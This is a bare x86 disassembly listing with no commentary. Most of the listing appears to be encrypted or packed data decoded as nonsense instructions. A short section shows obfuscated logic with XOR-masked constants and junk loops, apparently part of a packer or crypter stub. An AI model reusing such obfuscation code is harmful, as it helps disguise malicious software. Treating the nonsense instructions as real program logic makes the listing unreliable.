  407ed0:	rcl    DWORD PTR [edx-0x2331e1ce],0x38
  407ed7:	sahf   
  407ed8:	js     0x407e94
  407eda:	mov    edi,0xd847fa3e
  407edf:	sbb    ecx,DWORD PTR [edi]
  407ee1:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  407ee3:	mov    BYTE PTR [edi],al
  407ee5:	ss inc ecx
  407ee7:	cmc    
  407ee8:	ins    DWORD PTR es:[edi],dx
  407ee9:	repz inc edi
  407eeb:	clc    
  407eec:	sub    eax,0x465ed24f
  407ef1:	stos   BYTE PTR es:[edi],al
  407ef2:	xchg   ebp,ebp
  407ef4:	loope  0x407f72
  407ef6:	repz loopne 0x407ef1
  407ef9:	add    al,0x36
  407efb:	sbb    eax,0x747f210
  407f00:	inc    ebx
  407f01:	daa    
  407f02:	cwde   
  407f03:	out    dx,al
  407f04:	cmp    DWORD PTR [ecx],eax
  407f06:	ins    BYTE PTR es:[edi],dx
  407f07:	fsubr  st,st(0)
  407f09:	sbb    al,0xc8
  407f0b:	jecxz  0x407e8d
  407f0d:	(bad)  
  407f0e:	and    ebx,ecx
  407f10:	fwait
  407f11:	mov    edx,0xc00dc376
  407f16:	pop    ebx
  407f17:	adc    ecx,0xffffff96
  407f1a:	xlat   BYTE PTR ds:[ebx]
  407f1b:	cdq    
  407f1c:	sub    al,0x32
  407f1e:	shl    DWORD PTR [edi+0x3e],1
  407f21:	jns    0x407ecd
  407f23:	jne    0x407eb5
  407f25:	idiv   ah
  407f27:	push   cs
  407f28:	push   esi
  407f29:	ins    BYTE PTR es:[edi],dx
  407f2a:	mov    ds:0x84a9b73c,al
  407f2f:	and    BYTE PTR [eax+0x74ac53b5],0xaf
  407f36:	out    dx,eax
  407f37:	into   
  407f38:	pop    ebx
  407f39:	or     BYTE PTR [edx-0x7b],dh
  407f3c:	je     0x407f9f
  407f3e:	sub    eax,0x865eccbb
  407f43:	call   0xad51:0x1eb91f3a
  407f4a:	shr    BYTE PTR ds:0x6a4ab79d,1
  407f50:	dec    esp
  407f51:	test   al,0xc2
  407f53:	(bad)  
  407f54:	jns    0x407fbe
  407f56:	js     0x407ef0
  407f58:	cmp    DWORD PTR [ebx],esi
  407f5a:	repnz xchg edi,eax
  407f5c:	(bad)  
  407f5d:	xor    BYTE PTR [ebx-0x7e],bh
  407f60:	add    eax,0xd5ab0f8f
  407f65:	fidivr WORD PTR [ecx-0x617ee44d]
  407f6b:	ficom  DWORD PTR [ecx+0x4d]
  407f6e:	out    0x94,eax
  407f70:	cmp    dh,al
  407f72:	dec    edx
  407f73:	imul   ecx,DWORD PTR [ecx+ecx*2-0x40],0x9b00b330
  407f7b:	inc    ebp
  407f7c:	cld    
  407f7d:	cli    
  407f7e:	mov    ebp,0x2a3a262c
  407f83:	jns    0x407f13
  407f85:	fldcw  WORD PTR [esi+0x5537f4d9]
  407f8b:	pop    ebp
  407f8c:	cmp    al,0x33
  407f8e:	outs   dx,DWORD PTR ds:[esi]
  407f8f:	dec    edi
  407f90:	adc    al,0xd
  407f92:	push   es
  407f93:	pop    ecx
  407f94:	or     DWORD PTR [ecx+0x44eb00c6],eax
  407f9a:	hlt    
  407f9b:	dec    ebx
  407f9c:	adc    ebp,esi
  407f9e:	std    
  407f9f:	out    dx,al
  407fa0:	adc    WORD PTR [ebx+ecx*4+0x1435076c],bx
  407fa8:	mov    al,ds:0xe8b6fe36
  407fad:	mov    bh,0x7a
  407faf:	jecxz  0x407fd2
  407fb1:	imul   edx,eax,0xffffffd0
  407fb4:	cli    
  407fb5:	dec    edx
  407fb6:	gs mov edi,0xbf60761e
  407fbc:	hlt    
  407fbd:	jns    0x407fad
  407fbf:	pop    esi
  407fc0:	jl     0x40802e
  407fc2:	add    BYTE PTR [ecx+eax*4-0x529d184c],bh
  407fc9:	and    BYTE PTR [ebp+0x73b670dd],ch
  407fcf:	ja     0x40802b
  407fd1:	lea    ecx,[ecx-0xa33f474]
  407fd7:	scas   eax,DWORD PTR es:[edi]
  407fd8:	inc    ebx
  407fd9:	cmp    esi,DWORD PTR [edi-0x38]
  407fdc:	in     al,dx
  407fdd:	jle    0x408016
  407fdf:	jp     0x407fb8
  407fe1:	dec    edx
  407fe2:	mov    edi,gs
  407fe4:	fld    DWORD PTR [ebx]
  407fe6:	mov    ?,WORD PTR [edx]
  407fe8:	cmp    eax,0x510cbb04
  407fed:	add    eax,0xcc90c42b
  407ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ff3:	sub    BYTE PTR ds:0xd4487429,cl
  407ff9:	pop    esi
  407ffa:	pop    ds
  407ffb:	add    al,0x8b
  407ffd:	out    dx,eax
  407ffe:	jbe    0x407fa7
  408000:	jae    0x408070
  408002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408003:	sub    al,0x20
  408005:	dec    ebp
  408006:	xchg   ecx,eax
  408007:	retf   0xd957
  40800a:	pushf  
  40800b:	outs   dx,BYTE PTR ds:[esi]
  40800c:	rol    DWORD PTR [edx],0x9a
  40800f:	add    al,0xd5
  408011:	arpl   WORD PTR [ecx+0x78997370],di
  408017:	and    al,0x7e
  408019:	aam    0x13
  40801b:	ins    DWORD PTR es:[edi],dx
  40801c:	mov    ebx,0x4164fe73
  408021:	sbb    dl,ah
  408023:	dec    DWORD PTR [ebx+0xf]
  408026:	inc    edi
  408027:	add    al,cl
  408029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40802a:	(bad)  
  40802b:	mov    ecx,0x1932efaa
  408030:	and    dl,BYTE PTR [edi-0x742c2a5a]
  408036:	push   cs
  408037:	inc    ebp
  408038:	adc    bh,BYTE PTR [edi-0x39e6b73f]
  40803e:	dec    ebp
  40803f:	jb     0x407fe6
  408041:	mov    eax,0x4a07ac9c
  408046:	adc    eax,0x1a5604ca
  40804b:	out    dx,al
  40804c:	xor    DWORD PTR [edi],0xffffffb3
  40804f:	cli    
  408050:	jp     0x407ff9
  408052:	xor    eax,0x7e6f295b
  408057:	jo     0x408089
  408059:	fiadd  WORD PTR [edi-0x6baf8401]
  40805f:	imul   ebp,esp,0x336a96
  408065:	mov    WORD PTR [esi-0x42],gs
  408068:	xor    BYTE PTR [edi],0x1f
  40806b:	sub    al,0xc5
  40806d:	xchg   edi,eax
  40806e:	and    BYTE PTR [edi-0x6d046126],bh
  408074:	mov    cl,0x85
  408076:	call   FWORD PTR [edi]
  408078:	stos   DWORD PTR es:[edi],eax
  408079:	cld    
  40807a:	sbb    esp,DWORD PTR [ebx+0x6e]
  40807d:	fistp  WORD PTR [edi+0x31]
  408080:	push   esi
  408081:	jl     0x4080f5
  408083:	pop    ss
  408084:	sti    
  408085:	fadd   st(7),st
  408087:	xlat   BYTE PTR ds:[ebx]
  408088:	and    eax,0x72994451
  40808d:	jno    0x408090
  40808f:	xchg   ebp,eax
  408090:	xor    eax,esi
  408092:	mov    edx,0xffcd8f14
  408097:	sub    edx,eax
  408099:	jmp    0x4080ad
  40809e:	mov    eax,DWORD PTR [ebp-0x8]
  4080a1:	xor    eax,esi
  4080a3:	mov    edx,0xffcd8d14
  4080a8:	sub    edx,eax
  4080aa:	add    edx,DWORD PTR [ebp-0xc]
  4080ad:	mov    DWORD PTR [ebp-0xc],edx
  4080b0:	mov    eax,DWORD PTR [ebp-0x10]
  4080b3:	cmp    eax,0xf89c85b0
  4080b8:	jne    0x40383c
  4080be:	mov    DWORD PTR [ebp-0x20],0xa
  4080c5:	mov    ebx,DWORD PTR [ebp+0x8]
  4080c8:	xor    ebx,esi
  4080ca:	add    ebx,edi
  4080cc:	lea    eax,[ebx-0x3272ec]
  4080d2:	xor    eax,esi
  4080d4:	cmp    eax,0xf89c95b0
  4080d9:	je     0x40810c
  4080df:	lea    eax,[ebx+ecx*1]
  4080e2:	mov    DWORD PTR [ebp-0x14],eax
  4080e5:	mov    eax,DWORD PTR [ebp-0x28]
  4080e8:	sub    eax,ebx
  4080ea:	mov    DWORD PTR [ebp-0x18],eax
  4080ed:	push   DWORD PTR [ebp-0x18]
  4080f0:	push   DWORD PTR [ebp-0x14]
  4080f3:	call   0x408153
  4080f8:	mov    eax,DWORD PTR [ebp+0xc]
  4080fb:	mov    ecx,DWORD PTR [ebp-0x24]
  4080fe:	xor    eax,esi
  408100:	lea    ebx,[ebx+eax*1+0x3272ec]
  408107:	jmp    0x4080cc
  40810c:	dec    DWORD PTR [ebp-0x20]
  40810f:	jne    0x4080c5
  408115:	mov    eax,DWORD PTR [ebp+0x8]
  408118:	mov    edx,DWORD PTR [ebp+0xc]
  40811b:	mov    ebx,DWORD PTR [ebp+0x8]
  40811e:	xor    edx,esi
  408120:	mov    dl,BYTE PTR [edx+ecx*1+0x3272ec]
  408127:	xor    eax,esi
  408129:	mov    al,BYTE PTR [eax+ecx*1+0x3272ec]
  408130:	xor    ebx,esi
  408132:	mov    BYTE PTR [ebx+ecx*1+0x3272ec],dl
  408139:	mov    edx,DWORD PTR [ebp+0xc]
  40813c:	xor    edx,esi
  40813e:	mov    BYTE PTR [edx+ecx*1+0x3272ec],al
  408145:	mov    eax,DWORD PTR [ebp+0xc]
  408148:	xor    eax,esi
  40814a:	add    eax,edi
  40814c:	pop    edi
  40814d:	pop    esi
  40814e:	pop    ebx
  40814f:	leave  
  408150:	ret    0x8
  408153:	push   ebp
  408154:	mov    ebp,esp
  408156:	sub    esp,0x40
  408159:	add    edx,edx
  40815b:	mov    eax,DWORD PTR [ebp+0xc]
  40815e:	mov    DWORD PTR [ebp-0x18],eax
  408161:	mov    DWORD PTR ds:0x428663,0x712d
  40816b:	mov    eax,DWORD PTR [ebp+0x8]
  40816e:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  408175:	mov    DWORD PTR ds:0x428613,0x5be4
  40817f:	mov    DWORD PTR [ebp-0x30],eax
  408182:	sub    DWORD PTR ds:0x428667,ebx
  408188:	push   esi
  408189:	xor    DWORD PTR ds:0x42867b,0x42861b
  408193:	push   edi
  408194:	movzx  edi,WORD PTR ds:0x428647
  40819b:	add    DWORD PTR ds:0x428603,edi
  4081a1:	mov    edi,0xf89c85b1
  4081a6:	mov    DWORD PTR ds:0x428653,0x19
  4081b0:	cmp    DWORD PTR ds:0x428653,0x0
  4081b7:	je     0x408208
  4081bd:	cmp    DWORD PTR ds:0x428653,0x7
  4081c4:	jg     0x408208
  4081ca:	jmp    0x4081da
  4081cf:	push   0x428097
  4081d4:	call   DWORD PTR ds:0x4287c3
  4081da:	cmp    DWORD PTR ds:0x428653,0x8
  4081e1:	jne    0x4081f4
  4081e7:	mov    edx,DWORD PTR ds:0x428653
  4081ed:	dec    edx
  4081ee:	mov    DWORD PTR ds:0x428653,edx
  4081f4:	xor    edx,edx
  4081f6:	or     edx,DWORD PTR ds:0x428653
  4081fc:	dec    edx
  4081fd:	mov    DWORD PTR ds:0x428653,edx
  408203:	jmp    0x4081b0
  408208:	mov    DWORD PTR [ebp-0x8],edi
  40820b:	sbb    ecx,0x4b70
  408211:	mov    eax,DWORD PTR [ebp-0x14]
  408214:	mov    edx,DWORD PTR ds:0x4285cf
  40821a:	xor    DWORD PTR ds:0x4285e7,edx
  408220:	mov    ecx,0x75108a4
  408225:	or     DWORD PTR ds:0x4285ef,ecx
  40822b:	xor    eax,ecx
  40822d:	mov    esi,0x3272ec
  408232:	adc    DWORD PTR ds:0x4285db,edi
  408238:	add    eax,esi
  40823a:	mov    DWORD PTR [ebp-0x4],eax
  40823d:	mov    DWORD PTR ds:0x428667,0x1d
  408247:	cmp    DWORD PTR ds:0x428667,0x0
  40824e:	je     0x408296
  408254:	cmp    DWORD PTR ds:0x428667,0x28
  40825b:	jg     0x408296
  408261:	jmp    0x408284
  408266:	push   0x428633
  40826b:	push   DWORD PTR [ebp-0x10]
  40826e:	push   0x7f16
  408273:	push   0x6682
  408278:	push   DWORD PTR [ebp-0x20]
  40827b:	push   DWORD PTR [ebp-0x20]
  40827e:	call   DWORD PTR ds:0x4287c7
  408284:	mov    edx,DWORD PTR ds:0x428667
  40828a:	dec    edx
  40828b:	mov    DWORD PTR ds:0x428667,edx
  408291:	jmp    0x408247
  408296:	mov    eax,DWORD PTR [ebp-0x14]
  408299:	xor    eax,ecx
  40829b:	add    eax,esi
  40829d:	mov    DWORD PTR [ebp+0x8],eax
  4082a0:	mov    DWORD PTR [ebp-0x28],0xf89c8590
  4082a7:	xor    eax,DWORD PTR ds:0x428623
  4082ad:	mov    DWORD PTR [ebp-0x24],0xf89c85bf
  4082b4:	mov    eax,ds:0x4286d7
  4082b9:	mov    edx,DWORD PTR ds:0x4286eb
  4082bf:	sub    eax,edx
  4082c1:	xor    eax,DWORD PTR [eax+edx*1]
  4082c4:	mov    eax,DWORD PTR [ebp-0x14]
  4082c7:	mov    edx,DWORD PTR [ebp-0x18]
  4082ca:	xor    eax,ecx
  4082cc:	sbb    DWORD PTR ds:0x428677,0x289b
  4082d6:	add    eax,esi
  4082d8:	mov    DWORD PTR ds:0x428653,0x7663
  4082e2:	cmp    edx,eax
  4082e4:	je     0x40aa55
  4082ea:	mov    DWORD PTR ds:0x42861f,0x1f7b
  4082f4:	push   ebx
  4082f5:	jmp    0x40aa30
  4082fa:	mov    eax,ds:0x428607
  4082ff:	add    DWORD PTR ds:0x42865b,eax
  408305:	mov    edx,DWORD PTR [ebp-0x4]
  408308:	dec    eax
  408309:	mov    eax,DWORD PTR [ebp-0x18]
  40830c:	and    DWORD PTR ds:0x4285ef,0x33ad
  408316:	mov    ebx,DWORD PTR [ebp-0x28]
  408319:	sub    eax,edx
  40831b:	xor    ebx,ecx
  40831d:	adc    DWORD PTR ds:0x42863f,0x20c9
  408327:	xor    edx,edx
  408329:	add    ebx,esi
  40832b:	sub    DWORD PTR ds:0x428603,0x441d
  408335:	div    ebx
  408337:	xor    edx,DWORD PTR ds:0x42863b
  40833d:	jmp    0x40a6e1
  408342:	sbb    ecx,DWORD PTR [esi+0x78d7a47c]
  408348:	fwait
  408349:	and    esi,0xa416ec02
  40834f:	not    DWORD PTR [esi]
  408351:	aas    
  408352:	lahf   
  408353:	adc    al,0x7a
  408355:	jp     0x40834a
  408357:	pop    edi
  408358:	jp     0x4083d4
  40835a:	stc    
  40835b:	and    dl,BYTE PTR [edi]
  40835d:	ss jge 0x40831c
  408360:	cmp    BYTE PTR [esi],ah
  408362:	in     eax,dx
  408363:	add    DWORD PTR [ecx-0x11],edx
  408366:	aaa    
  408367:	scas   eax,DWORD PTR es:[edi]
  408368:	std    
  408369:	and    DWORD PTR [ecx+ebp*8+0x46],ecx
  40836d:	(bad)  
  40836e:	out    dx,eax
  40836f:	call   0x552e:0x9fabb337
  408376:	xchg   edi,ebx
  408378:	pop    ss
  408379:	sbb    BYTE PTR [ebp+esi*2-0x510dcad8],ah
  408380:	jle    0x4083a1
  408382:	sar    BYTE PTR [ebx+0x2926c600],cl
  408388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408389:	call   0x688:0x4bd87c31
  408390:	push   ebx
  408391:	sub    BYTE PTR [esi+0x7b],bh
  408394:	lock mov edx,0x25a1441d
  40839a:	mov    dh,0xae
  40839c:	pop    ds
  40839d:	push   ebp
  40839e:	sub    ah,BYTE PTR [esi+0x2d]
  4083a1:	iret   
  4083a2:	xlat   BYTE PTR ds:[ebx]
  4083a3:	push   ebx
  4083a4:	fcom   DWORD PTR [esi-0xfa11f7c]
  4083aa:	push   esp
  4083ab:	pusha  
  4083ac:	arpl   WORD PTR [ebp-0x1f04fedc],bp
  4083b2:	push   ecx
  4083b3:	outs   dx,DWORD PTR ds:[esi]
  4083b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083b5:	and    DWORD PTR [esi+0x6ee8c8e9],ebp
  4083bb:	push   0x9
  4083bd:	stos   BYTE PTR es:[edi],al
  4083be:	xchg   BYTE PTR [ebx-0x3e4661c8],dh
  4083c4:	mov    cl,0x4b
  4083c6:	bound  ecx,QWORD PTR [ebp+0x6621d33a]
  4083cc:	xor    ebx,ebx
  4083ce:	je     0x4083e4
  4083d0:	add    BYTE PTR [edx],ch
  4083d2:	je     0x40840c
  4083d4:	fist   DWORD PTR [esi-0x62]
  4083d7:	inc    eax
  4083d8:	in     al,0xfd
  4083da:	popf   
  4083db:	stos   DWORD PTR es:[edi],eax
  4083dc:	mov    ?,edi
  4083de:	mov    al,0xc1
  4083e0:	pop    ebx
  4083e1:	mov    al,ds:0xa52dc421
  4083e6:	push   esi
  4083e7:	dec    eax
  4083e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083e9:	icebp  
  4083ea:	ja     0x4083bd
  4083ec:	imul   esp,DWORD PTR [esi+ecx*4],0x9b9d336c
  4083f3:	out    dx,eax
  4083f4:	adc    esi,DWORD PTR [esi+0x6eba39b1]
  4083fa:	call   0x7fa7c56a
  4083ff:	sbb    al,0x37
  408401:	daa    
  408402:	sbb    al,0xac
  408404:	outs   dx,BYTE PTR ds:[esi]
  408405:	clc    
  408406:	pop    edi
  408407:	mov    esi,0xe8dfebf7
  40840c:	pop    edx
  40840d:	jno    0x4083a3
  40840f:	loop   0x40846a
  408411:	cmp    esp,DWORD PTR [edx-0x49]
  408414:	ins    DWORD PTR es:[edi],dx
  408415:	gs (bad) 
  408417:	push   ecx
  408418:	mov    ds:0xbecb7c4b,eax
  40841d:	adc    al,0xc1
  40841f:	shl    DWORD PTR [esi+0x2dc94f6d],1
  408425:	jle    0x4083c5
  408427:	pop    es
  408428:	mov    dh,0x78
  40842a:	loopne 0x408415
  40842c:	or     eax,0x1929ec76
  408431:	xchg   esp,esi
  408433:	push   0x40613031
  408438:	jmp    0x576c6ccc
  40843d:	lods   al,BYTE PTR ds:[esi]
  40843e:	mov    al,ds:0xac761b5a
  408443:	test   eax,0x74f7ae3d
  408448:	dec    edi
  408449:	sahf   
  40844a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40844b:	sub    BYTE PTR [ecx+0x3e],0x4f
  40844f:	and    dh,BYTE PTR [edi+0x3c7c0dc6]
  408455:	mov    al,0xec
  408457:	popa   
  408458:	sbb    BYTE PTR [ebx-0x7d11451a],al
  40845e:	mov    edx,0x18bc6106
  408463:	add    eax,0xa9802a23
  408468:	cli    
  408469:	push   cs
  40846a:	test   BYTE PTR [eax-0x6b],bl
  40846d:	pusha  
  40846e:	stos   DWORD PTR es:[edi],eax
  40846f:	gs jg  0x40849c
  408472:	push   0x4d
  408474:	jp     0x408410
  408476:	cmp    BYTE PTR [edx],al
  408478:	inc    eax
  408479:	add    BYTE PTR [eax+0x2cb9a3f9],cl
  40847f:	icebp  
  408480:	(bad)  
  408481:	inc    ecx
  408482:	cmc    
  408483:	mov    ah,0x13
  408485:	push   edx
  408486:	scas   eax,DWORD PTR es:[edi]
  408487:	mov    ch,0x6c
  408489:	sti    
  40848a:	cmc    
  40848b:	out    0xf0,eax
  40848d:	mov    ecx,0xfd13982c
  408492:	test   eax,0x45dce37d
  408497:	iret   
  408498:	pop    edx
  408499:	mov    eax,0x72e32a54
  40849e:	sbb    DWORD PTR ds:0x73335b53,0x16
  4084a5:	mov    dl,0x1d
  4084a7:	jae    0x408517
  4084a9:	xchg   esi,eax
  4084aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084ab:	mov    edi,0xf7fbb901
  4084b0:	cmp    dl,BYTE PTR [ebx-0x71ea9fae]
  4084b6:	xchg   ebx,eax
  4084b7:	mov    esi,edx
  4084b9:	mov    dl,0xfc
  4084bb:	or     BYTE PTR [edx+0x67ca6060],bl
  4084c1:	xor    DWORD PTR [edx-0x48e3397c],ebx
  4084c7:	ins    BYTE PTR es:[edi],dx
  4084c8:	inc    ebx
  4084c9:	sub    eax,0xb315d07b
  4084ce:	aam    0x21
  4084d0:	or     eax,0xbd687976
  4084d5:	jle    0x40846b
  4084d7:	stos   DWORD PTR es:[edi],eax
  4084d8:	lods   al,BYTE PTR ds:[esi]
  4084d9:	mov    ebx,0x8ee8e15b
  4084de:	cmc    
  4084df:	sub    edi,DWORD PTR [edx-0x75349188]
  4084e5:	or     al,0x6
  4084e7:	pop    ecx
  4084e8:	stos   BYTE PTR es:[edi],al
  4084e9:	push   eax
  4084ea:	push   cs
  4084eb:	dec    edx
  4084ec:	jg     0x40850a
  4084ee:	scas   al,BYTE PTR es:[edi]
  4084ef:	mov    ds:0xd0d93ceb,eax
  4084f4:	addr16 mov bl,0xaf
  4084f7:	lock int 0xeb
  4084fa:	add    dh,BYTE PTR [ecx-0x1]
  4084fd:	fst    DWORD PTR [ebp-0x7c]
  408500:	mov    ah,BYTE PTR [edx-0xb]
  408503:	scas   eax,DWORD PTR es:[edi]
  408504:	rcr    DWORD PTR [edi+0x49],cl
  408507:	aad    0x40
  408509:	jno    0x408554
  40850b:	mov    dh,0x35
  40850d:	dec    BYTE PTR [edx]
  40850f:	or     ah,bl
  408511:	popa   
  408512:	ss cmp al,0xfd
  408515:	dec    ecx
  408516:	cli    
  408517:	push   es
  408518:	xlat   BYTE PTR ds:[ebx]
  408519:	cmc    
  40851a:	mov    ch,0x56
  40851c:	or     eax,ecx
  40851e:	clc    
  40851f:	outs   dx,BYTE PTR ds:[esi]
  408520:	dec    esp
  408521:	mov    al,0x5e
  408523:	lea    edx,[ebp-0x22]
  408526:	ss dec ebx
  408528:	jo     0x40853b
  40852a:	stos   BYTE PTR es:[edi],al
  40852b:	test   DWORD PTR [eax],0x65e2920f
  408531:	add    BYTE PTR [ebx-0x79],dl
  408534:	(bad)  
  408535:	or     ebx,ebp
  408537:	inc    BYTE PTR [esi-0x6325755]
  40853d:	add    eax,0x8df8d8a7
  408542:	cli    
  408543:	sahf   
  408544:	and    cl,BYTE PTR [ebx+0x43c41349]
  40854a:	rol    BYTE PTR [edx],1
  40854c:	xchg   DWORD PTR [ebx+0x28],esp
  40854f:	stc    
  408550:	add    al,0x5a
  408552:	adc    ecx,ebp
  408554:	sub    dh,cl
  408556:	test   DWORD PTR [edi+0x54],ecx
  408559:	call   0x8723b918
  40855e:	scas   al,BYTE PTR es:[edi]
  40855f:	data16 in al,dx
  408561:	hlt    
  408562:	inc    ebx
  408563:	aam    0x86
  408565:	stc    
  408566:	test   ebp,edi
  408568:	mov    es,WORD PTR [ebp-0x44895e89]
  40856e:	int    0xe6
  408570:	sbb    BYTE PTR cs:[eax],bl
  408573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408574:	(bad)  
  408575:	loop   0x4085c3
  408577:	hlt    
  408578:	in     al,dx
  408579:	or     eax,0xbb07f7d0
  40857e:	cmp    DWORD PTR [esi],esi
  408580:	inc    ebx
  408581:	sub    eax,DWORD PTR [edx+0x1556231d]
  408587:	jbe    0x4085f6
  408589:	inc    eax
  40858a:	pop    edx
  40858b:	out    0x66,eax
  40858d:	add    al,0xb
  40858f:	pushf  
  408590:	fdivr  DWORD PTR [esi+ebp*1]
  408593:	jae    0x408586
  408595:	pop    ebx
  408596:	push   ebp
  408597:	jns    0x4085f0
  408599:	xchg   ecx,eax
  40859a:	fisttp QWORD PTR [esp+ebx*2]
  40859d:	outs   dx,BYTE PTR ds:[esi]
  40859e:	jl     0x4085f9
  4085a0:	inc    esp
  4085a1:	call   0xe2a:0xc29fb1da
  4085a8:	jno    0x408578
  4085aa:	xor    esi,DWORD PTR [ebx-0x2c1ea6eb]
  4085b0:	xchg   esi,eax
  4085b1:	mov    cl,0x44
  4085b3:	dec    esp
  4085b4:	test   BYTE PTR [esp+ebx*1-0x23389f41],0x8
  4085bc:	push   esp
  4085bd:	fdivr  QWORD PTR [ebp-0x7a6e92b7]
  4085c3:	cld    
  4085c4:	imul   eax,DWORD PTR ds:0x878e4500,0x15
  4085cb:	mov    BYTE PTR [ebx],bh
  4085cd:	mov    esi,0x371b5aa0
  4085d2:	les    esp,FWORD PTR [ebp-0x2a]
  4085d5:	scas   eax,DWORD PTR es:[edi]
  4085d6:	lds    esi,FWORD PTR [ebp+0x7]
  4085d9:	dec    edx
  4085da:	and    BYTE PTR [edi+0x22cf5128],al
  4085e0:	dec    ebp
  4085e1:	add    ebp,ebx
  4085e3:	mov    ch,0x36
  4085e5:	loopne 0x408596
  4085e7:	ins    DWORD PTR es:[edi],dx
  4085e8:	sahf   
  4085e9:	(bad)  
  4085ea:	mov    bh,cl
  4085ec:	sbb    BYTE PTR [ebx+0x57],ah
  4085ef:	jecxz  0x40863c
  4085f1:	nop
  4085f2:	push   ss
  4085f3:	add    BYTE PTR [edi+esi*1-0x10d0344b],ah
  4085fa:	xor    DWORD PTR [edi-0x3351954d],0xe47ca6b5
  408604:	sbb    eax,0xa222e213
  408609:	pop    DWORD PTR [eax-0x4a9138f7]
  40860f:	mov    bh,0x11
  408611:	(bad)  
  408612:	mov    esi,0x8abe0044
  408617:	mov    ds:0x8154a974,al
  40861c:	test   DWORD PTR [eax-0x15],ebp
  40861f:	retw   0x9417
  408623:	xchg   BYTE PTR [edi],cl
  408625:	dec    cx
  408627:	or     al,0x3b
  408629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40862a:	sbb    dh,BYTE PTR [edi-0x38]
  40862d:	iret   
  40862e:	mov    edi,0x6194984a
  408633:	sbb    BYTE PTR [eax-0x2f],dh
  408636:	adc    DWORD PTR [esi+0x6e],esp
  408639:	in     al,dx
  40863a:	mov    bh,0xe8
  40863c:	sbb    al,0x84
  40863e:	shufps xmm6,XMMWORD PTR [eax+0x6f],0x36
  408643:	adc    DWORD PTR [esi+esi*4-0x542fb61f],edx
  40864a:	lea    ebp,[ecx+0x1a]
  40864d:	lods   eax,DWORD PTR ds:[esi]
  40864e:	es push ds
  408650:	sub    BYTE PTR [ecx-0x6a],bl
  408653:	sar    eax,cl
  408655:	jb     0x408697
  408657:	sub    BYTE PTR [esi-0xaed0150],bh
  40865d:	add    esi,ebx
  40865f:	rcr    BYTE PTR [edx+0xb],1
  408662:	bsr    ebx,DWORD PTR [ebp-0x55c017e6]
  408669:	sub    edi,DWORD PTR [edi]
  40866b:	sub    BYTE PTR [eax-0x8],ah
  40866e:	xchg   DWORD PTR [ecx-0x749083f],ebx
  408674:	or     DWORD PTR [ecx-0x15],0x4d31cb5e
  40867b:	cmp    BYTE PTR [edi-0x8],bl
  40867e:	call   0xb093:0x561e89c6
  408685:	lods   eax,DWORD PTR ds:[esi]
  408686:	add    BYTE PTR [edx],0x97
  408689:	cld    
  40868a:	repz dec sp
  40868d:	adc    al,0xff
  40868f:	xor    eax,ebx
  408691:	inc    ecx
  408692:	push   ebx
  408693:	iret   
  408694:	scas   al,BYTE PTR es:[edi]
  408695:	dec    ebp
  408696:	cdq    
  408697:	inc    edx
  408698:	or     ch,BYTE PTR [ebx]
  40869a:	dec    edx
  40869b:	sti    
  40869c:	mul    BYTE PTR [ebx]
  40869e:	clc    
  40869f:	xchg   ecx,eax
  4086a0:	cld    
  4086a1:	lea    edx,gs:[edx]
  4086a4:	xor    al,0x25
  4086a6:	push   0x128a5f40
  4086ab:	jno    0x408677
  4086ad:	jp     0x4086b5
  4086af:	leave  
  4086b0:	mov    dh,0x4
  4086b2:	nop
  4086b3:	adc    BYTE PTR [ecx-0x10],0xa6
  4086b7:	add    bh,dl
  4086b9:	shl    bl,1
  4086bb:	stos   BYTE PTR es:[edi],al
  4086bc:	dec    ah
  4086be:	cmp    BYTE PTR [edi-0x11],bl
  4086c1:	jmp    0x40869b
  4086c3:	pop    esp
  4086c4:	(bad)
  4086c7:	xor    BYTE PTR [esi+0x115b06dd],bh
  4086cd:	enter  0xf40f,0x59
  4086d1:	je     0x4086a5
  4086d3:	dec    edi
  4086d4:	pop    ecx
  4086d5:	sahf   
  4086d6:	nop
  4086d7:	iret   
  4086d8:	dec    esi
  4086d9:	fs mov ch,0x33
  4086dc:	jnp    0x4086a0
  4086de:	mov    ebp,0xbff59e68
  4086e3:	add    BYTE PTR [ebp-0x71],al
  4086e6:	imul   esp,DWORD PTR [ebp+0x64],0x57
  4086ea:	(bad)  [eax-0x38e0a312]
  4086f0:	imul   eax,eax,0x6e691aa7
  4086f6:	inc    ebp
  4086f7:	(bad)  
  4086f8:	xchg   ecx,eax
  4086f9:	push   edx
  4086fa:	jmp    0x7bf16850
  4086ff:	cmp    ecx,0x57ffd7df
  408705:	push   0x28
  408707:	cli    
  408708:	xor    eax,0x6df23cb9
  40870d:	pop    edx
  40870e:	ins    BYTE PTR es:[edi],dx
  40870f:	into   
  408710:	push   edi
  408711:	jae    0x408777
  408713:	test   edx,edi
  408715:	outs   dx,BYTE PTR ds:[esi]
  408716:	add    al,0x3
  408718:	pop    esi
  408719:	dec    esi
  40871a:	in     al,dx
  40871b:	shl    ah,0xe9
  40871e:	push   ss
  40871f:	retf   0x46f5
  408722:	loope  0x408783
  408724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408725:	loop   0x4086b0
  408727:	(bad)  
  408728:	jg     0x4086bb
  40872a:	mov    eax,edi
  40872c:	scas   eax,DWORD PTR es:[edi]
  40872d:	mov    dh,0x9c
  40872f:	push   ss
  408730:	jp     0x408728
  408732:	je     0x408733
  408734:	xor    ebx,DWORD PTR [esi-0x77]
  408737:	ficomp WORD PTR [ebx]
  408739:	cmp    BYTE PTR [esi+0x13d1e1a9],ch
  40873f:	push   esp
  408740:	(bad)  
  408742:	rcl    BYTE PTR [ecx+ebx*1-0x36],1
  408746:	sbb    eax,0xc5653e6f
  40874b:	neg    DWORD PTR [esp+ebx*2]
  40874e:	mov    ebx,DWORD PTR [ecx+0x53]
  408751:	inc    ebp
  408752:	adc    bh,BYTE PTR [edi]
  408754:	xchg   BYTE PTR [ebx+0x6d],ch
  408757:	enter  0x6fb6,0x5
  40875b:	out    0xe7,eax
